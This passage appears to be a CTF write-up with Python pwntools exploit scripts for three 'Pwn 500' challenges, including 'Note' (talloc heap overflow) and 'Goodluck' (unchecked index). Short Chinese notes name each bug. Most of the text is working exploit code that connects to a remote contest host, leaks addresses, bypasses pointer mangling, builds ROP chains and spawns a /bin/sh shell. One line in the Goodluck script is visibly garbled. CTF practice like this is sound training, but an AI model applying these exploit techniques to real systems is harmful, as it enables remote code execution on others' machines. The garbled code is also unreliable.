sl('3')
ru('number:')
sl(str(index))
ru('name:')
sl(name)
ru('age:')
sl(str(age))
ru('addr:')
sl(addr)
ru('introduce:')
sl(intro)
return
def view(index):
menu()
sl('2')
ru('number:')
sl(str(index))
return
def ror11_64(x):
mask = 0xffffffffffffffff
result = (mask & (x>>0x11)) | (mask & (x>(64-0x11)))
return result
# define exploit function here
def pwn():
runscript = '''
b _setjmp
'''
if DEBUG: gdb.attach(io,execute=runscript)
init(iOverflow)
view(1)
ru('name:')
leaked_rip = u64(rn(6).ljust(8, '\x00'))
info("Leaked RIP = " + hex(leaked_rip))
expected_rip = leaked_rip - 0xAA0 + 0x1495
pie = expected_rip - 0x1495
poprdi = pie + 0x0000000000001523
poprsir15 = pie + 0x0000000000001521
malloc_got = pie + 0x202060
puts_plt = pie + 0x9A0
handle = pie + 0x1355
ru('addr:')
rsp = u64(rn(8))
addr_hex = ru(',')[:-1]
if len(addr_hex) != 8:
log.warning("possible 0 byte in addr, re-run this.")
exit(0)
addr_hex = ror11_64(u64(addr_hex))
cookie = addr_hex ^ expected_rip
log.info("__pointer_chk_guard_local = " + hex(cookie))
rsp = ror11_64(rsp) ^ cookie
log.info("Leaked RSP = " + hex(rsp))
offset = 72
payload = p64(rol11_64(cookie ^ (rsp - offset))) + p64(rol11_64(cookie ^ poprdi))
assert '\n' not in payload
edit(1, "", 0, payload, "")
prefix = '5 AAAAAA'
rop = ''
rop += p64(malloc_got)
rop += p64(puts_plt)
rop += p64(handle)
payload = prefix + rop
assert '\n' not in payload
menu()
sl(payload)
malloc_addr = u64(rn(6).ljust(0x8, "\x00"))
log.info("malloc_addr = " + hex(malloc_addr))
libc = malloc_addr - 0x0000000000082660
system = libc + 0x46590
binsh = libc + 0x17c8c3
offset2 = 112
payload = p64(rol11_64(cookie ^ (rsp - offset2))) + p64(rol11_64(cookie ^ poprdi))
edit(1, "", 0, payload, "")
prefix = "5 BBBBBB"
rop = ''
rop += p64(binsh)
rop += p64(system)
payload = prefix + rop
assert '\n' not in payload
menu()
sl(payload)
io.interactive()
return
if __name__ == '__main__':
pwn()
Note (Pwn 500)
Edit 时可以指定偏移造成堆溢出。talloc 的堆头有 next, prev 指针，在 unlink 时没有检查，可
以造成任意地址读写。
脚本：
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
import os, sys
# switches
DEBUG = 0
LOCAL = 0
VERBOSE = 1
os.environ['LD_PRELOAD'] = './libtalloc.so.2.1.0'
# modify this
if LOCAL:
io = process('./note')
else:
io = remote('58.213.63.30',4003)
if VERBOSE: context(log_level='debug')
# define symbols and offsets here
# simplified r/s function
def ru(delim):
return io.recvuntil(delim)
def rn(count):
return io.recvn(count)
def ra(count):
# recv all
buf = ''
while count:
tmp = io.recvn(count)
buf += tmp
count -= len(tmp)
return buf
def sl(data):
return io.sendline(data)
def sn(data):
return io.send(data)
def info(string):
return log.info(string)
def dehex(s):
return s.replace(' ','').decode('hex')
def limu8(x):
return c_uint8(x).value
def limu16(x):
return c_uint16(x).value
def limu32(x):
return c_uint32(x).value
# define interactive functions here
def menu():
return ru('--->>')
def add(title, size, content):
menu()
sl('1')
ru(':')
sl(title)
ru(':')
sl(str(size))
ru(':')
sl(content)
return
def edit(index, offset, data):
menu()
sl('3')
ru(':')
sl(str(index))
ru(':')
sl(str(offset))
ru(':')
sl(data)
return
def delete(index):
menu()
sl('4')
ru(':')
sl(str(index))
return
def changetitle(index, title):
menu()
sl('5')
ru(':')
sl(str(index))
ru(':')
sl(title)
return
# define exploit function here
def pwn():
if DEBUG: gdb.attach(io)
# header size = 0x10 ptmalloc + 0x60 talloc
for i in xrange(10):
add('11111111', 0x70, '11111111')
payload = '1' + p64(0) + p64(0xa1) + p64(0x6020C8) + p64(0x6020d8)
payload = payload.ljust(47, '\x00')
edit(8, 0x6f, payload)
for i in xrange(1, 9):
delete(i)
delete(9)
printf_got = 0x4007E0
changetitle(2, p64(0x602110))
changetitle(3, p64(11))
# avoid crashing
changetitle(2, p64(0x602048))
changetitle(3, p64(printf_got)[:-1])
add('~%13$p~', 0x70, '11111111')
delete(11)
ru('~0x')
libc_ret = int(ru('~')[:-1], 16)
info("libc_ret = " + hex(libc_ret))
libc_ret_offset = 0x21f45
system_offset = 0x0000000000046590
libc = libc_ret - libc_ret_offset
system = libc + system_offset
changetitle(2, p64(0x602048))
changetitle(3, p64(system)[:-1])
add('/bin/sh;', 0x70, '11111111')
delete(12)
io.interactive()
return
if __name__ == '__main__':
pwn()
Goodluck (Pwn 500)
所有的根据 index 的操作都没有检查 index 是否合法，利用这个漏洞可以达到任意地址读写。
P.S. 出题人的本意应该是个 race condition?
脚本：
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
import os, sys
import time
# switches
DEBUG = 0
LOCAL = 0
VERBOSE = 1
# modify this
if LOCAL:
io = process('./goodluck')
else:
io = remote('58.213.63.30',11502)
if VERBOSE: context(log_level='debug')
# define symbols and offsets here
# simplified r/s function
def ru(delim):
return io.recvuntil(delim)
def rn(count):
return io.recvn(count)
def ra(count):
# recv all
buf = ''
while count:
tmp = io.recvn(count)
buf += tmp
count -= len(tmp)
return buf
def sl(data):
return io.sendline(data)
def sn(data):
return io.send(data)
def info(string):
return log.info(string)
def dehex(s):
return s.replace(' ','').decode('hex')
def limu8(x):
return c_uint8(x).value
def limu16(x):
return c_uint16(x).value
def limu32(x):
return c_uint32(x).value
# define interactive functions here
def menu():
return ru('choice:')
def add(t,name,a1,a2,a3=""):
menu()
sl('1')
ru('flower')
sl(str(t))
ru('name:')
sn(name)
if t == 0 or t == 3:
ru('number:')
sl(str(a1))
ru('again:')
sn(a2)
else:
ru('want:')
sl(str(a1))
ru('suitable:')
sl(str(a2))
ru('something:')
sn(a3)
return
def delete(index):
menu()
sl('2')
ru('delete:')
sl(str(index))
return
def show(index, a1=1):
menu()
sl('4')
ru('show\n')
sl(str(index))
return
def edit(index, data):
menu()
sl('3')
ru('edit:')
sl(str(index))
ru('something\n')
sn(data)
return
# define exploit function here
def pwn():
if DEBUG: gdb.attach(io)
add(0, "123", 80, 80*'A')
delete(4)
time.sleep(1)
show(0)
ru('s1->')
leak = u64(ru(' ')[:-1].ljust(8, '\x00'))
info("Leaked PIE = " + hex(leak))
pie = leak - 0x1040
ru('ii1->')
p1 = limu32(int(ru(' ')[:-1]))
ru('ii2->')
p2 = limu32(int(ru('\n')[:-1]))
heap_leak = p1 + ((p2) ')
atoi_addr = u64(rn(6).ljust(8, '\x00'))
info("atoi_addr = " + hex(atoi_addr))
libc = atoi_addr - 0x39ea0
malloc_hook = libc + 0x3BE740
payload = ''
payload += p64(heap_base + 0x448)
payload += p64(1)
payload += p64(malloc_hook)
payload += 'AABBCCDD'
payload = payload.ljust(80, '\x00')
add(0, '666', 80, payload)
index = ((heap_base + 0x440) - (pie + 0x2031A0))/8
onegadget = libc + 0x4647C
edit(index, p64(onegadget))
menu()
sl('1')
ru('?')
sl('0')
io.interactive()
return
if __name__ == '__main__':
pwn()